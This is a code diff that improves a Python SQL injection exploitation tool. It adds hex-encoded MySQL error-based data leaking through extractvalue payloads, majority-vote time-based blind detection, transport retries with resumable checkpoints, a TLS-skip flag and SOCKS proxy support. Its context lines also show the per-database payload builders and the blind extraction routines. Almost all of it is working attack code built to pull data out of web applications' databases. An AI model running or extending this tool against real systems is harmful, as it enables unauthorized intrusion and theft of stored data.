@@ -58,12 +58,16 @@ EXAMPLES
 import sys, os, time, json, re, hashlib, argparse, urllib.parse, threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import requests
-
-requests.packages.urllib3.disable_warnings()
+import urllib3
 
 DELIM = "QxZx"                      # marker wrapped around error-based leaks
 PROBE = "Prb0"                     # constant used to detect error reflection
 TRUE_COND, FALSE_COND = "1=1", "1=2"
+
+
+class RequestError(Exception):
+    """An HTTP request ultimately failed (after transport retries). Catchable so
+    extraction can checkpoint and exit cleanly instead of crashing the process."""
 
 
 # ===========================================================================
@@ -93,10 +97,13 @@ class Dbms:
     def sleep_stacked(self, cond, sleep): return None  # used after ';'
 
     # --- error-based: SQL fragment (after AND/OR) that errors out leaking value
+    error_hex = False                 # True if the leaked token is hex (decode at the end)
     def error_expr(self, inner): return None
     def error_value(self, text):
         m = re.search(re.escape(DELIM) + "(.*?)" + re.escape(DELIM), text, re.S)
         return m.group(1) if m else None
+    def error_finalize(self, token):  # raw reflected token -> real value
+        return token
 
     # --- schema mapping queries (override per DBMS) ---
     list_sep = ","
@@ -130,17 +137,27 @@ class Postgres(Dbms):
 class MySQL(Dbms):
     name = "mysql"
     stacked = False
-    error_trunc = 30               # extractvalue reflects ~32 chars total (incl ~)
+    # value is HEX-encoded so quotes/specials/multibyte survive; ~14 chars/chunk keeps
+    # the hex (~28) + marker within extractvalue's ~32-char reflection limit.
+    error_trunc = 14
+    error_hex = True
     fingerprints = ["CONNECTION_ID()>0"]
     def substr(self, e, p): return f"substring(({e}),{p},1)"
     def sleep_inline(self, cond, sleep):
         return f"IF(({cond}),SLEEP({sleep}),0)=0"
     def error_expr(self, inner):
-        # single leading ~ marker; survives the ~32-char extractvalue truncation
-        return f"extractvalue(1,concat(0x7e,({inner})))"
+        return f"extractvalue(1,concat(0x7e,hex(({inner}))))"
     def error_value(self, text):
-        m = re.search(r"~([^'<>\"]+)", text)
+        m = re.search(r"~([0-9A-Fa-f]+)", text)
         return m.group(1) if m else None
+    def error_finalize(self, token):
+        if not token:
+            return token
+        token = token[:len(token) // 2 * 2]            # drop any half-byte from truncation
+        try:
+            return bytes.fromhex(token).decode("utf-8", "replace")
+        except ValueError:
+            return token
     def quote_ident(self, name): return "`" + name.replace("`", "``") + "`"
     def q_current_db(self): return "SELECT database()"
     def q_tables(self):
@@ -186,7 +203,11 @@ class Oracle(Dbms):
     stacked = False
     fingerprints = ["(SELECT 1 FROM v$version WHERE rownum=1)=1"]
     # boolean works great; time/error left None (handled via boolean fallback)
-    def quote_ident(self, name): return name   # bare: Oracle folds unquoted idents to upper
+    def quote_ident(self, name):
+        # Oracle folds unquoted idents to upper; keep them bare but whitelist to avoid injection
+        if not re.match(r"^[A-Za-z0-9_$#]+$", name):
+            raise SystemExit(f"[!] refusing unsafe Oracle identifier: {name!r}")
+        return name
     def q_current_db(self): return "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual"
     def q_tables(self):
         return "SELECT listagg(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables"
@@ -233,7 +254,10 @@ def parse_request_file(path, proto):
     raw = open(path, "r", encoding="utf-8", errors="ignore").read().replace("\r\n", "\n")
     head, _, body = raw.partition("\n\n")
     lines = head.split("\n")
-    method, target, _ = (lines[0].split() + ["", "", ""])[:3]
+    parts = lines[0].split()
+    if len(parts) < 2:
+        raise SystemExit(f"[!] malformed request line in {path!r}: {lines[0]!r}")
+    method, target = parts[0], parts[1]
     headers = {}
     for ln in lines[1:]:
         if ":" in ln:
@@ -260,10 +284,21 @@ class Target:
         else:
             self.url, self.data, self.headers = a.url, a.data, {}
             for h in (a.header or []):
+                if ":" not in h:
+                    raise SystemExit(f"[!] bad header (expected 'Name: value'): {h!r}")
                 k, v = h.split(":", 1)
                 self.headers[k.strip()] = v.strip()
             self.method = (a.method or ("POST" if a.data else "GET")).upper()
         self.proxies = {"http": a.proxy, "https": a.proxy} if a.proxy else None
+        if a.proxy and a.proxy.startswith("socks"):
+            try:
+                import socks  # noqa: F401  (PySocks, pulled in by requests[socks])
+            except ImportError:
+                raise SystemExit("[!] SOCKS proxy needs PySocks: pip install requests[socks]")
+        self.verify = not getattr(a, "insecure", False)
+        if not self.verify:
+            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+        self.session = requests.Session()    # keep-alive + cookie persistence
         self._baseline = None
 
     def baseline(self, a):
@@ -290,17 +325,23 @@ class Target:
         headers.pop("Content-Length", None)
         if data and not any(k.lower() == "content-type" for k in headers):
             headers["Content-Type"] = "application/x-www-form-urlencoded"
-        with self._lock:
-            self.count += 1
-        t = time.time()
-        try:
-            r = requests.request(self.method, url, data=data, headers=headers,
-                                 proxies=self.proxies, verify=False,
-                                 timeout=self.a.sleep + 20, allow_redirects=False)
-        except requests.exceptions.RequestException as e:
-            raise SystemExit(f"\n[!] request error: {e}\n"
-                             "    (progress is checkpointed - re-run to resume)")
-        return Resp(r.status_code, r.text or "", time.time() - t)
+        attempts = getattr(self.a, "net_retries", 2) + 1
+        for attempt in range(attempts):
+            with self._lock:
+                self.count += 1
+            start = time.time()
+            try:
+                r = self.session.request(self.method, url, data=data, headers=headers,
+                                         proxies=self.proxies, verify=self.verify,
+                                         timeout=self.a.sleep + 20, allow_redirects=False)
+                return Resp(r.status_code, r.text or "", time.time() - start)
+            except requests.exceptions.RequestException as e:
+                if attempt < attempts - 1:
+                    time.sleep(0.4 * (attempt + 1))     # brief backoff, then retry
+                    continue
+                raise RequestError(
+                    f"request failed after {attempts} attempts: {e}\n"
+                    "    (progress is checkpointed - re-run the same command to resume)")
 
 
 # ===========================================================================
@@ -372,12 +413,10 @@ class TimeOracle(Oracle_):
             return f"{self.ctx.close};{self.dbms.sleep_stacked(cond, self.a.sleep)}{self.dbms.comment}"
         return f"{self.ctx.close}{self.ctx.logic}{self.dbms.sleep_inline(cond, self.a.sleep)}{self.dbms.comment}"
     def fires(self, cond):
-        for attempt in range(self.a.retries + 1):
-            slow = self.t.send(self._payload(cond)).elapsed >= self.thresh
-            if slow and attempt < self.a.retries:
-                continue
-            return slow
-        return True
+        # majority vote over (retries+1) samples — robust to jitter in either direction
+        n = self.a.retries + 1
+        slow = sum(self.t.send(self._payload(cond)).elapsed >= self.thresh for _ in range(n))
+        return slow * 2 > n
 
 
 # ===========================================================================
@@ -472,8 +511,8 @@ def find_error(target, dbms, a, contexts):
             continue
         probe_inner = f"'{PROBE}'"
         payload = f"{ctx.close}{ctx.logic}{dbms.error_expr(probe_inner)}{dbms.comment}"
-        r = target.send(payload)
-        if dbms.error_value(r.text) and PROBE in r.text:
+        tok = dbms.error_value(target.send(payload).text)
+        if tok and dbms.error_finalize(tok) == PROBE:
             print(f"[+] error reflection on {ctx.name} ({dbms.name})")
             return ctx
     return None
@@ -539,20 +578,23 @@ def extract_error(target, dbms, ctx, a, query=None):
         return dbms.error_value(target.send(p).text)
 
     if not dbms.error_trunc:
-        return leak(f"({query})")
-    # chunked for DBMS that truncate error text (e.g. MySQL)
-    out, start, chunk = "", 1, dbms.error_trunc
+        tok = leak(f"({query})")
+        return dbms.error_finalize(tok) if tok else tok
+    # chunked for DBMS that truncate error text (e.g. MySQL). Accumulate the raw
+    # tokens and finalize ONCE at the end so multibyte sequences aren't split.
+    raw, start, chunk = "", 1, dbms.error_trunc
     while True:
         piece = leak(f"substring(({query}),{start},{chunk})")
         if not piece:
             break
-        out += piece
-        if len(piece) < chunk:
+        raw += piece
+        got = (len(piece) // 2) if dbms.error_hex else len(piece)
+        if got < chunk:
             break
         start += chunk
         if start > a.maxlen * 16:        # generous cap for long aggregates
             break
-    return out
+    return dbms.error_finalize(raw)
 
 
 def extract_search(oracle, a, state_path, sig, value="", length=None):
@@ -567,28 +609,37 @@ def extract_search(oracle, a, state_path, sig, value="", length=None):
         todo = list(range(len(value) + 1, length + 1))
         chars = {}
 
-        def _resolve(p, tries=2):
-            # isolate per-position failures so one bad worker can't kill the batch
-            for attempt in range(tries + 1):
+        def _resolve(p):
+            # retry transient transport errors so one blip can't kill the batch
+            for attempt in range(a.net_retries + 1):
                 try:
                     return oracle.char_confirmed(q, p)
-                except Exception:
-                    if attempt == tries:
+                except RequestError:
+                    if attempt == a.net_retries:
                         raise
             return None
 
+        next_idx = len(value) + 1               # next position to commit contiguously
+
+        def _commit():                          # extend value by any contiguous run; checkpoint
+            nonlocal value, next_idx
+            grew = False
+            while next_idx in chars:
+                value += chars[next_idx]; next_idx += 1; grew = True
+            if grew:
+                save_state(state_path, sig, length, value, oracle.t.count)
+
         with ThreadPoolExecutor(max_workers=a.threads) as ex:
             futures = {ex.submit(_resolve, p): p for p in todo}
-            for fut in as_completed(futures):
-                chars[futures[fut]] = fut.result()
-
-        # commit only the contiguous prefix from the resume point —
-        # a missing position must not shift later characters
-        for p in todo:
-            if p not in chars:
-                break
-            value += chars[p]
-        save_state(state_path, sig, length, value, oracle.t.count)
+            try:
+                for fut in as_completed(futures):
+                    chars[futures[fut]] = fut.result()
+                    _commit()                   # incremental checkpoint as the prefix fills
+            except RequestError:
+                for f in futures:
+                    f.cancel()
+                _commit()                       # persist whatever contiguous prefix we have
+                raise                           # handled at top level; resume picks up here
         return value
 
     print(f"[*] extracting: {value}", end="", flush=True)
@@ -614,6 +665,7 @@ def _bin_length(oracle, query, cap):
     hi = 1
     while hi < cap and oracle.fires(f"{lenexpr}>{hi}"):
         hi *= 2
+    capped = hi >= cap
     hi = min(hi, cap)
     lo = 0
     while lo < hi:
@@ -622,6 +674,9 @@ def _bin_length(oracle, query, cap):
             lo = mid + 1
         else:
             hi = mid
+    if lo == cap and capped and oracle.fires(f"{lenexpr}>{cap}"):
+        print(f"[!] value length reached the cap ({cap}); raise --maxlen to get the rest",
+              file=sys.stderr)
     return lo
 
 
@@ -741,11 +796,14 @@ def main():
     tun.add_argument("--cal-samples", type=int, default=5, dest="cal_samples", help="baseline latency samples for adaptive timing")
     tun.add_argument("--max-codepoint", type=int, default=0x10FFFF, dest="max_codepoint", help="upper bound for Unicode extraction")
     tun.add_argument("--retries", type=int, default=1)
+    tun.add_argument("--net-retries", type=int, default=2, dest="net_retries",
+                     help="transport-level retries on connection errors (with backoff)")
     tun.add_argument("--threads", type=int, default=1, help="parallel workers for boolean extraction")
     tun.add_argument("--maxlen", type=int, default=4096, help="max value length / length-probe cap")
     tun.add_argument("--ascii", dest="ascii_only", action="store_true",
                      help="ASCII-only target: skip the Unicode probe (1 fewer request/char)")
     tun.add_argument("--proxy")
+    tun.add_argument("--insecure", action="store_true", help="skip TLS verification (and silence its warning)")
 
     res = ap.add_argument_group("resume")
     res.add_argument("--state"); res.add_argument("--fresh", action="store_true")
@@ -815,4 +873,11 @@ def main():
 
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except RequestError as e:
+        print(f"\n[!] {e}", file=sys.stderr)
+        sys.exit(2)
+    except KeyboardInterrupt:
+        print("\n[!] interrupted", file=sys.stderr)
+        sys.exit(130)
